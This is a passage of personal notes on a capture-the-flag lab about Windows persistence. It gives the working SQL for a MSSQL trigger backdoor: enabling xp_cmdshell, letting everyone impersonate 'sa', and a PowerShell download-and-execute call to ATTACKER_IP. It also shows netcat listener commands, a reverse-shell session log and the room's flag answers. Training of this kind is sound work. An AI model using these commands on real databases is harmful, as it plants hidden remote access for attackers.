Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable xp_cmdshell.

```
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

After this, we must ensure that any website accessing the database can run xp_cmdshell. By default, only database users with the sysadmin role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the sa user, which is the default database administrator:

```
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

After all of this, we finally configure a trigger. We start by changing to the HRDB database:

```
USE HRDB
```

Our trigger will leverage xp_cmdshell to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an INSERT is made into the Employees table of the HRDB database:

```
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';


```

Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:

![[Pasted image 20220911151553.png]]

We will need to open two terminals to handle the connections involved in this exploit:

    The trigger will perform the first connection to download and execute evilscript.ps1. Our trigger is using port 8000 for that.
    The second connection will be a reverse shell on port 4454 back to our attacker machine.

```

AttackBox

user@AttackBox$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 

        


```

```

AttackBox

user@AttackBox$ nc -lvp 4454
Listening on 0.0.0.0 4454

        


```

	With all that ready, let's navigate to http://MACHINE_IP/ and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
	THM flagUse your web shell to execute C:\flags\flag17.exe to get your flag!


```

```

![[Pasted image 20220911180949.png]]

![[Pasted image 20220911181031.png]]

Insert flag16 here
*THM{EZ_WEB_PERSISTENCE}* https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx

![[Pasted image 20220911181956.png]]

![[Pasted image 20220911182030.png]]

![[Pasted image 20220911182053.png]]

![[Pasted image 20220911182115.png]]
```
┌──(kali㉿kali)-[~/payloads]
└─$ nc -lvp 4454
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4454
Ncat: Listening on 0.0.0.0:4454
Ncat: Connection from 10.10.242.120.
Ncat: Connection from 10.10.242.120:49763.
whoami
nt service\mssql$sqlexpress
PS C:\Windows\system32> cd C:\Flags
PS C:\Flags> .\flag17.exe
THM{I_LIVE_IN_YOUR_DATABASE}

after create evilscript.ps1 and query in sqlserver
```


Insert flag17 here
*THM{I_LIVE_IN_YOUR_DATABASE}*


### Conclusion 



In this room, we have covered the primary methods used by attackers to establish persistence on a machine. You could say persistence is the art of planting backdoors on a system while going undetected for as long as possible without raising suspicion. We have seen persistence methods that rely on different operating system components, providing various ways to achieve long-term access to a compromised host.

While we have shown several techniques, we have only covered a small fraction of those discovered. If you are interested in learning other techniques, the following resources are available:

    Hexacorn - Windows Persistence https://www.hexacorn.com/blog/category/autostart-persistence/
    PayloadsAllTheThings - Windows Persistence https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
    Oddvar Moe - Windows Persistence Through RunOnceEx  https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
    PowerUpSQL https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/


Click and continue learning!
*No answer needed*


[[Network Security Solutions]]